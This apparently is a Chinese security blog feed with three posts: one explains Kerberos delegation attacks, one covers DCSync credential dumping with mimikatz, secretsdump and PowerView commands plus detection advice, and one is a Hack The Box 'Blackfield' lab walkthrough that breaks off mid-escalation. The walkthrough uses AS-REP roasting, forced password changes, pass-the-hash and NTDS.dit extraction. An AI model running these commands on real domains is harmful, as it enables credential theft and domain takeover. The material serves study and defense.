+        <content type="html"><![CDATA[<h2 id="概念">概念</h2>
+<p>委派是大型网络中经常部署的应用模式，给多跳认证带来了很大的便利，与此同时也带来了很大的安全隐患。利用委派，攻击者可结合其他漏洞进行组合攻击，导致攻击者可以获取本地管理员甚至域管理员权限，还可以制作深度隐藏的后门。</p>
+<p>委派是指将域内用户的权限委派给其他服务账号，使得服务账号能以用户权限访问域内的其他服务。<strong>简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</strong></p>
+<p>如图所示 用户white0123\test以Kerberos身份验证访问 Web服务器请求下载文件 但是真正的文件在后台的文件服务器上。于是，web服务器的服务账号模拟域用户white0123\test 以Kerberos协议继续认证到后台文件服务器。后台服务器将文件返回给web服务器，web服务器将文件返回给域用户white0123\test。这样就完成了一个委派的流程。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231207135833290.png" alt="image-20231207135833290" loading="lazy"></figure>
+<p>在域中，只有主机账户和服务账户才具有委派属性。</p>
+<ul>
+<li>
+<p>主机账户就是活动目录Computers中的计算机，也可以称为机器账户。</p>
+</li>
+<li>
+<p>服务账户就是域内用户账户的一种类型，是将服务运行起来并加入域时所用的账户。</p>
+<p>例如：SQLServer在安装时会在域内自动注册服务账户SQLServiceAccount,也可以将域用户通过注册SPN变为服务账户。</p>
+</li>
+</ul>
+<h2 id="委派的分类">委派的分类</h2>
+<p>委派的主要有三个分类</p>
+<ul>
+<li>非约束性委派</li>
+<li>约束性委派</li>
+<li>基于资源的约束性委派</li>
+</ul>
+<h3 id="非约束性委派">非约束性委派</h3>
+<p>在Windows Server2000首次发布Active Directory时，Microsoft就提供了一种简单的机制来支持用户通过Kerberos向Web Server进 行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案，这就是最早的非约束性委派。对于非约束性委派 （Unconstrained Delegation），<strong>服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT， 模拟该用户访问任意服务</strong>。非约束委派的设置需要SeEnableDelegation 特权，该特权通常仅授予域管理员 。</p>
+<ul>
+<li>配置了非约束性委派属性的机器账号的userAccountControl 属性有个Flag位 WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。</li>
+<li>配置了非约束性委派属性的服务账号的userAccountControl 属性有个Flag位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， 其对应的数是0x80200=524800。</li>
+</ul>
+<p>查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）</p>
+<p>1、 利用powersploit中的powerview</p>
+<pre><code class="language-sql">Import-Module .\PowerView.ps1;
+
+查询非约束委派的主机 Get-NetComputer -Unconstrained -Domain yokan.com
+
+查询非约束委派的服务账号 Get-NetUser -Unconstrained -Domain yokan.com | select name
+</code></pre>
+<p>2、 利用ADFind</p>
+<p>查找域中配置非约束委派的用户</p>
+<pre><code class="language-armasm">AdFind.exe -b &quot;DC=yokan,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+</code></pre>
+<p>查找域中配置非约束委派的主机</p>
+<pre><code class="language-armasm">AdFind.exe -b &quot;DC=yokan,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+</code></pre>
+<p>3、 ldapsearch</p>
+<p>非约束性委派<em>大致</em>流程</p>
+<p>user访serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，<strong>如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给serverA</strong>，这样serverA在验证ST票据的同时也获取到了用户的TGT，并<strong>把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来模拟这个user访问任何服务</strong>。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1964477-20220419131129863-350299903.jpg" alt="img" loading="lazy"></figure>
+<p>从攻击角度来说：<strong>如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境</strong>。</p>
+<h4 id="结合打印机漏洞攻击">结合打印机漏洞攻击</h4>
+<p>上面的攻击手段 需要域管主动连接配置了非约束性委派的主机，才能从主机上获得域管理员的TGT。实战中有点鸡肋。我们可以结合打印机服务漏洞来强制域控连接配置了非约束性委派的主机，也能从该主机上抓到域控制器账户的TGT，且不需要域管理员进行交互。</p>
+<p>复现文章参考</p>
+<p>https://mp.weixin.qq.com/s/1sR0wTyJFf5UnuPjtJ-DWw</p>
+<h3 id="约束性委派">约束性委派</h3>
+<p>由于非约束性委派的不安全性，微软在Windows Server 2003中发布了约束性委派。同时，为了在Kerberos协议层面对约束性委派的支持，微软扩展了两个子协议 S4u2Self(Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )，这两个扩展都允许服务代表用户从KDC请求票证。<strong>S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST1)；S4U2proxy可以以用户的名义请求其它服务的ST2，约束委派就是限制了S4U2proxy扩展的范围</strong>, 只能模拟该用户访问特定的服务。配置了约束性委派账户的msDS- AllowedToDelegateTo属性会指定对哪个SPN进行委派。约束委派的设置需要 SeEnableDelegation 特权，该特权通常仅授予域管理员。</p>
+<h4 id="约束性委派的分类">约束性委派的分类</h4>
+<p>约束性委派有两种:一种是仅使用Kerberos，也就是不能进行协议转换；另一种是使用任何身份验证协议，也就是能进行协议转换。</p>
+<h5 id="仅使用kerberos">仅使用Kerberos</h5>
+<p>配置了仅使用Kerberos约束性委派的机器账户和服务账户的userAccountControl属性和正常账户一样，但是其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN。</p>
+<h5 id="使用任何身份验证协议">使用任何身份验证协议</h5>
+<ul>
+<li>配置了任何身份验证协议约束性委派的机器账户的userAccountControl属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16781312</li>
+<li>配置了任何身份验证协议约束性委派的机器账户的userAccountControl属性有个FLAG位 NORMAL_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16777728</li>
+</ul>
+<p>约束性委派的流程</p>
+<p>user访问serviceA，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对serviceA进行访问</p>
+<p>如果配置了serviceA到serviceB的约束委派，则serviceA能使用<strong>S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给DC。</strong></p>
+<p><strong>域控返回serviceA一个用来访问serviceB的ST2票据,这样serviceA就能以用户的身份对serviceB发起访问。</strong></p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1964477-20220419131124644-675606978.jpg" alt="img" loading="lazy"></figure>
+<p>由于服务用户<strong>只能获取某个用户（或主机）的服务的ST1而非TGT，所以只能模拟用户访问特定的服务</strong>，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以<strong>伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2</strong></p>
+<p>约束性委派的攻击流程</p>
+<p>在拿到一台主机的时候 通过抓取到本机用户的账号密码 可以向KDC认证中心申请一个可转发的TGT，然后服务账号可用域管的身份申请一个可转发的ST 服务账号用上一步的可转发的ST以域管身份向KDC申请访问特定服务的ST。导入上一步获得的以域管身份访问的特定服务的ST可成功访问域控。</p>
+<h3 id="基于资源的约束性委派">基于资源的约束性委派</h3>
+<p>传统的委派，在设置的过程中其实都是需要SeEnableDelegation特权，而这个特权需要域管理员才能设置。相对于传统的委派，<strong>基于资源的约束委派它不需要域管理员设置，而是机器本身</strong>。</p>
+<p>基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束性委派只能在运行<strong>Windows Server 2012和Windows Server 2012 R2及以上的域控制器</strong>上配置，但可以在混合模式林中应用。<strong>配置了基于资源的约束性委派账户的msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许委派账号的SID</strong>，并且委派属性这里没有任何值。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1964477-20220419131119445-1613490976.jpg" alt="img" loading="lazy"></figure>
+<h4 id="约束委派和基于资源的约束委派的区别">约束委派和基于资源的约束委派的区别</h4>
+<p>前者：通过服务A委派到服务B，实际是在服务A上增加TRUSTED_FOR_DELEGATION字段（非约束委派），TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION和msDS-AllowedToDelegateTo （约束委派）字段来达到委派的目的。</p>
+<p>后者：<strong>通过服务B允许服务A委派到服务B，实际是通过服务B自身赋予msDS-AllowedToActOnBehalfOfOtherIdentity字段，从而允许服务A对服务B的基于资源的约束委派</strong>。</p>
+<p>所以当利用到基于资源的约束委派的时候，<strong>服务A的两个字段是没有赋值的</strong>，当这两个字段没有被赋值的时候，通过S4U2Self得到的ST服务票证是<strong>不可被转发</strong>的，而S4U2Proxy的作用就是将可转发的ST票据转发到其他服务进行委派认证的。但是：<strong>在基于资源的约束委派过程中，不可转发的ST仍可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后还会返回一张可转发的ST服务票证</strong>。</p>
+<p>因此，如果能够<strong>在服务B上配置允许服务A的基于资源的约束委派</strong>，那么就可以通过控制服务A使用S4U2Self向域控请求任意用户访问自身的服务票据，最后再使用S4U2Proxy转发此ST票据去请求访问服务B的可转发的ST服务票据，那么我们就可以模拟任意用户访问服务B了。这里可以以普通域用户的身份去创建机器账号作为服务A。</p>
+<h4 id="基于资源的约束性委派的优势">基于资源的约束性委派的优势</h4>
+<p>1、委派的权限授予给了拥有资源的后端，而不再是前端</p>
+<p>2、约束性委派不能跨域进行委派，基于资源的约束性委派<strong>可以跨域和林</strong></p>
+<p>3、不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，也就是拥有**’将域机器加入域’<strong>的</strong>域用户和机器自身**的权限。</p>
+<h4 id="基于资源的约束性委派利用条件">基于资源的约束性委派利用条件</h4>
+<p>利用基于资源的约束委派(RBCD)需要2个条件：</p>
+<p>1.<strong>拥有将域机器加入域的域用户的权限</strong>。（<strong>将机器B加入域的域用户拥有修改机器B的msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限</strong>。）</p>
+<p>2.一<strong>个任意服务账户或者一个机器账户</strong>（每一个域用户都可以添加10个机器账户）</p>
+<p>补充：</p>
+<p>1.如果导入powerview后执行以下命令后有回显，证明win7主机配置了基于资源的约束性委派。</p>
+<p><em>Get-DomainComputer win7 -Properties msds-allowedtoactonbehalfofotheridentity</em></p>
+<p>2.查找将win主机拉入域内的人的sid，其实就是查找这台主机的mS-DS-CreatorSID值：</p>
+<p><em>AdFind.exe -b &quot;DC=yokan,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369))&quot; cn mS-DS-CreatorSID</em></p>
+<h4 id="基于资源的约束性委派流程">基于资源的约束性委派流程</h4>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1964477-20220419131119144-2121654180.jpg" alt="img" loading="lazy"></figure>
+<h4 id="基于资源的约束性委派利用">基于资源的约束性委派利用</h4>
+<p>这里偷了个懒 参考复现过程</p>
+<p>https://forum.butian.net/share/1591</p>
+<h2 id="参考链接">参考链接</h2>
+<p>https://www.cnblogs.com/yokan/p/16164761.html</p>
+<p>https://www.cnblogs.com/xiaozi/p/17072605.html</p>
+<p>https://mp.weixin.qq.com/s/1sR0wTyJFf5UnuPjtJ-DWw</p>
+<p>https://www.bilibili.com/video/BV1564y1Y7HF/?spm_id_from=333.337.search-card.all.click</p>
+<p>https://forum.butian.net/share/1591</p>
+<p>https://mp.weixin.qq.com/s/GdmnlsKJJXhElA4GuwxTKQ</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透基础之滥用DCSync]]></title>
+        <id>https://wghahaha.github.io/post/yu-shen-tou-ji-chu-zhi-lan-yong-dcsync/</id>
+        <link href="https://wghahaha.github.io/post/yu-shen-tou-ji-chu-zhi-lan-yong-dcsync/">
+        </link>
+        <updated>2023-12-07T03:30:08.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="滥用dcsync">滥用DCSync</h2>
+<p>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。</p>
+<p>在DCSync功能出现以前，要想获得域用户的哈希数据等，需要登陆域控并在其上执行操作才能获得域用户数据。2015年8月，新版的mimikatz增加了DCSync功能，他有效的''模拟“了一个域控，并向目标域控请求账户哈希值等数据。该功能的最大特点是可以实现不登陆域控而获取目标域控上的数据。</p>
+<p><strong>注意</strong>：默认情况下，不允许从只读域控上获取数据，因为只读域控是不能复制同步数据给其他域控的。</p>
+<h2 id="dcsync的工作原理">DCSync的工作原理</h2>
+<p>DCSync是如何工作的呢？总的来说分为以下的两步：</p>
+<p>1）在网络中发现域控<br>
+2）利用目录复制服务的GetNCChanges接口向域控发起数据同步的请求</p>
+<p>下面来看看详细的工作过程：</p>
+<p>当一个域控（我们称之为客户端）希望从另一个域控（我们称之为服务端）获得活动目录对象更新时，客户端域控会向服务端域控发起DRSGetNCChanes请求。该请求的响应包含一组客户端必须应用于其复制副本的更新。如果更新集太大，可能只有一条响应消息。在这种情况下，将完成多个DRSGetNCChanes请求和响应。这个过程被称为复制周期或简单的循环。</p>
+<p>当服务端域控收到复制同步请求时，然后对执行复制的每个客户端域控来说，他会执行一个复制周期。这类似于客户端中使用的DRSGetNCChanes请求。</p>
+<h2 id="修改-dcsync-acl">修改 DCSync ACL</h2>
+<p>到底是什么用户才具有运行DCSync 的权限呢？能不能通过修改普通用户的ACL使其获得DCSync的权限呢？带着这个疑问，我们往下看。</p>
+<h3 id="1-具有dcsync权限的用户">1、具有DCSync权限的用户</h3>
+<p>运行DCSync需要具有特殊的权限，默认情况下，只有以下组中的用户具有运行DCSync的权限</p>
+<ul>
+<li>Administrator 组内的用户</li>
+<li>Domain Admins 组内的用户</li>
+<li>Enterprise Admins 组内的用户</li>
+<li>域控计算机账户</li>
+</ul>
+<p>我们可以使用Adfind执行如下的命令查询域内具备具备DCSync权限的用户：</p>
+<pre><code>AdFind.exe -s subtree -b &quot;DC=hack,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes&quot;;; -recmute
+</code></pre>
+<h3 id="2-修改dcsync的acl">2、修改DCSync的ACL</h3>
+<p>如何让普通域用户也获得DCSync的权限呢？一般情况下，只需要想普通域用户加入下面两条ACE即可：</p>
+<ul>
+<li>DS-Replication-Get-Changes：复制目录更改权限，该权限只能从给定的域复制数据，不包括私密域数据。该ACE的rightsGUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2。</li>
+<li>DS-Replication-Get-Changes-ALL:复制目录更改所有项权限，该权限允许复制给定的任意域中的所有数据，包括私密域数据。该ACE为rightsGUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2。</li>
+</ul>
+<p><strong>注意</strong>：其实还有 Replicating Directory Changes In Filtered Set（复制筛选集中的目录更改权限）但还是很少见，仅在某些环境中需要，所以可以忽略。该ACE的rightsGUID为：89e95b76-444d-4e62-991a-0facbeda640c。</p>
+<p>(1) 图形化赋予指定用户的DCSync权限</p>
+<p>打开“Active Directory 用户和计算机”——&gt;&quot;查看“——&gt;&quot;高级功能”，找到域 hack.com ，右击，选择“属性&quot;选项，然后在弹出的对话框中单击&quot;安全&quot;选项卡的”高级“按钮，可以看到Domain Controlles具备&quot;复制目录更改所有项的权限&quot;,这也就是为什么Domain Controlles具备 DCSync权限了。然后单击”添加&quot; 按钮，&quot;主体”选项选择需要赋予权限的用户，这里的选择用户 hack\jack，&quot;应用于&quot;选择“只是这个对象&quot;,如图所示</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373900_64563f4c42fb0936c7747.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>在”权限“下勾选”复制目录更改“和&quot;复制目录更改所有项&quot;复选框，如图所示，单机”确定“按钮就可以看到用户hack具有的权限了，如图所示：用户jack具有DCSync权限。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373922_64563f62864b4f378f433.jpeg" alt="图片.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373932_64563f6c5c4fac739566a.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>（2）Powershell脚本赋予指定用户DSCync权限</p>
+<p>可以使用Empire下的PowerView.ps1脚本执行命令如下，赋予用户test DCSync权限。</p>
+<pre><code>Import-Module .\pwerview.ps1;
+Add-DomainObjectAcl -TargetIdentity 'DC=hack,DC=com' -PrincipalIde test -Rights DCSync -Verbose
+</code></pre>
+<h2 id="dcsync-攻击">DCSync 攻击</h2>
+<p>如果拿到了具有DCSync权限的用户，就能利用DCSync功能从指定域控获得域内所有用户的凭据信息了。</p>
+<p>用户jack当前以被赋予了DCSync权限，下面介绍利用不同工具进行DCSync攻击。</p>
+<h3 id="1-impacket">1、Impacket</h3>
+<p>Impacket下的secretsdump.exe可以通过DCSync功能导出域用户的Hash，使用方法如下：</p>
+<pre><code>#使用impacket包中的secretsdump.exe程序直接读取
+secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373971_64563f936d7fee162c87c.jpeg" alt="图片.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373980_64563f9c2fb855e7fa93c.jpeg" alt="图片.png" loading="lazy"></figure>
+<h3 id="2-mimikatz">2、mimikatz</h3>
+<p>mimikatz也可以通过DCSync功能导出域用户的Hash，使用方法如下：</p>
+<pre><code>#获取域用户krbtgt的Hash
+lasdump::dcsync /domain:hack.com /user:krbtgt
+#获取所有用户的Hash
+lsadump::dcsync /domain:hack.com /all /csv
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373999_64563fafa3521e6106727.jpeg" alt="图片.png" loading="lazy"></figure>
+<h3 id="3-powershell脚本">3、 PowerShell脚本</h3>
+<p>下载地址：<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
+<p>Invoke-DCSync.ps1脚本也可以通过DCSync功能导出域用户的Hash，使用方法如下：</p>
+<pre><code>Import-Moudle .\Invoke-DCSync.ps1
+#导出域内所有用户的Hash
+Invoke-DCSync -DumForest | ft -wrap -autosize
+#导出域内用户的krbtgt的Hash
+Invoke-DCSync -DumpForest -Users @(&quot;krbtgt&quot;) | ft -wrap -autosize
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374027_64563fcb5e2fa49ffa93d.jpeg" alt="图片.png" loading="lazy"></figure>
+<h2 id="利用dcsync-获取明文凭据">利用DCSync 获取明文凭据</h2>
+<p>有时候利用DCSync可以获取明文凭据，这是因为账户勾选了&quot;使用可逆加密存储密码的属性&quot;,用户再次更改密码会显示其明文密码。</p>
+<p>当通过远程访问Internet身份验证服务(IAS)或使用质询握手身份验证协议（CHAP）身份验证时，必须启用“使用可逆加密存储密码”属性。在Internet信息服务中使用摘要式身份验证时，也需要启动此属性。启动此属性后，就能通过DCSync抓取到目标用户的明文凭据了</p>
+<p>如图所示，在“jack属性”对话框勾选“使用可逆加密存储密码”选项，然后对用户jack进行密码更改</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374050_64563fe24987c0a4a26b1.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>此时使用secretsdump.py脚本执行如下的命令获取获取用户jack的明文凭据：</p>
+<pre><code>python3 secretsdump.py hack/Administrator:123456 -dc-ip 192.168.41.10 -just-dc-user jack
+</code></pre>
+<h2 id="dcsync攻击防御">DCSync攻击防御</h2>
+<p>防守方如何针对DCSync攻击做检测和防御呢？</p>
+<h3 id="1-dcsync攻击防御">1、DCSync攻击防御</h3>
+<p>由于DCSync攻击的原理是模拟域控向另外的域控发起数据同步的请求，因此，可以配置网络安全设备过滤流量并设置白名单，只允许指定白名单内的域控IP请求数据同步。</p>
+<h3 id="2-dcsync-acl-滥用检测">2、 DCSync ACL 滥用检测</h3>
+<p>下载地址：<code>https://github.com/cyberark/ACLight</code></p>
+<p>1）可以在网络安全设备上检测来自白名单以外的域控数据同步复制<br>
+2）使用工具检测域内具备DCSync权限的用户。这里可以使用Execute-ACLight2.bat脚本文件进行检测，该工具输出的结果比较直观。执行完该脚本以后，会在当前目录的results生成三个文件。Privilege Accounts -Layes Analysis.txt是我们要查看生成的结果文件，打开该文件即可看到有哪些用户具有DCSync权限，如图所示</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374068_64563ff4cedf4cae7c46c.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>除了默认的Administrator域管理员有DCSync权限，用户jack也具有DCSync 权限。</p>
+<p>如果发现域内恶意用户被赋予了DCSync权限后，可以使用Empire下的PowerView.ps1脚本执行如下的命令移除DCSync权限：</p>
+<pre><code>Import-Module .\powerview.ps1
+Remove-DomainObjectACL -TargetIdentity “DC=hack,DC=com&quot; -PrincipalIdentity jack -Rights DCSync
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374083_64564003da7543484da4c.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>文章转载来源于   https://www.freebuf.com/articles/network/365750.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ Active Directory 101-Blackfield]]></title>
+        <id>https://wghahaha.github.io/post/blackfield/</id>
+        <link href="https://wghahaha.github.io/post/blackfield/">
+        </link>
+        <updated>2023-12-06T10:30:17.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="blackfield">Blackfield</h1>
+<h2 id="前言">前言</h2>
+<p>继续AD域的靶机。这是一台hard难度的靶机 这也是我在HTB做的第一台hard靶机 以前主要做的是easy 和medium难度的。做了好久。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>还是一上来使用nmap扫描一下端口的信息。</p>
+<pre><code>nmap -sC -sV -p- 10.10.10.192 -oA nmap——Blackfield
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 11:44 CST
+Nmap scan report for 10.10.10.192
+Host is up (0.33s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-06 10:58:07Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m54s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-12-06T10:58:29
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 911.28 seconds
+
+</code></pre>
+<p>通过扫描得到了一些敏感端口 53 88 445等。</p>
+<p>简单尝试了一下DNS枚举和 kerberos枚举没有得到什么有用的信息，尝试一下SMB枚举。</p>
+<h3 id="smb枚举">SMB枚举</h3>
+<pre><code>crackmapexec smb 10.10.10.192 -u &quot;&quot; -p &quot;&quot; --shares
+</code></pre>
+<pre><code>smbmap -u guess -H 10.10.10.192
+</code></pre>
+<p>得到一些smb的共享服务。选择可匿名访问的。</p>
+<pre><code>smbclient -U guest //10.10.10.192/profiles\$
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206155239623.png" alt="image-20231206155239623" loading="lazy"></figure>
+<p>目录下一堆类似于用户名的东西。将这些保存下来进行kerberos用户名枚举。</p>
+<pre><code>./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield.local /root/HTB/Blackfield/users.txt
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206155929552.png" alt="image-20231206155929552" loading="lazy"></figure>
+<p>枚举出来了存在的用户名。</p>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<p>将得到的信息保存到新的文件中 尝试进行 AS-REP Roasting 。主要是通过没有进行预认证操作的用户 获得账号密码。</p>
+<pre><code>GetNPUsers.py  -no-pass   -dc-ip 10.10.10.161  blackfield.local/ -usersfile user.txt
+</code></pre>
+<p>我们发现support没有设置预认证，我们拿到了其AS-REP的票据 通过john解密。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206161016083.png" alt="image-20231206161016083" loading="lazy"></figure>
+<p>得到了账号密码。但是经过尝试和之前的共享目录的权限是一样的。</p>
+<h2 id="blood信息收集">Blood信息收集</h2>
+<p>这里由于权限原因 使用的是python版blood。进行信息收集。</p>
+<pre><code>bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly
+</code></pre>
+<p>通过这条命令可进行信息收集。</p>
+<p>然后通过blood进行信息分析。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206162016877.png" alt="image-20231206162016877" loading="lazy"></figure>
+<p>可以看出 这里可以修改 support用户可以修改adui2020用户的密码。</p>
+<h2 id="forcechangepassword权限滥用实现横向移动">ForceChangePassword权限滥用实现横向移动</h2>
+<pre><code>rpcclient -U support //10.10.10.192
+Password for [WORKGROUP\support]:
+rpcclient $&gt; ls
+command not found: ls
+rpcclient $&gt; setuserinfo2 audit2020 23 'white0123'
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+rpcclient $&gt; setuserinfo2 audit2020 23 'white0123#'
+rpcclient $&gt; 
+</code></pre>
+<p>修改密码。</p>
+<p>查看一下权限的变化。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206162728295.png" alt="image-20231206162728295" loading="lazy"></figure>
+<p>相比较于之前的多了一个forensic访问权限。</p>
+<p>进去看一下。</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206163849889.png" alt="image-20231206163849889" loading="lazy"></figure>
+<p>得到一些敏感信息 其中包含了administrator的密码。但是经过尝试 发现不正确。</p>
+<h2 id="利用lsass内存捕获文件提取用户hash">利用Lsass内存捕获文件提取用户hash</h2>
+<p>其中有一个lsass,zip文件这是一个内存文件 可能会存在密码hash。将其下载下来使用密码提取工具 提取出来。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206165803449.png" alt="image-20231206165803449" loading="lazy"></figure>
+<p>出现了这三个 只有最后一个才可以成功。</p>
+<pre><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206165902033.png" alt="image-20231206165902033" loading="lazy"></figure>
+<p>成功登录。</p>
+<h2 id="利用sebackupprivilege权限进行ntdsdt卷影拷贝实现权限提升">利用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升</h2>
+<pre><code>攻击的步骤大概分三步
+- 获取文件副本，`NTDS.dit`即存储 Active Directory 用户凭据的数据库。
+- 接下来，我们将获取 SYSTEM hive 文件，其中包含解密 NTDS.dit 所必需的系统启动密钥
+- 使用 Impacket 的 secretsdump 脚本从 NTDS.dit 中提取域中所有用户的 NTLM 哈希
+</code></pre>
+<p>通过我们之前导入的bloodhound的分析结果，我们得知该用户属于backup_operators组的成员</p>
+<pre><code>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; whoami /priv 
+PRIVILEGES INFORMATION 
+---------------------- 
+Privilege Name                Description                    State 
+============================= ============================== 
+======= 
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre>
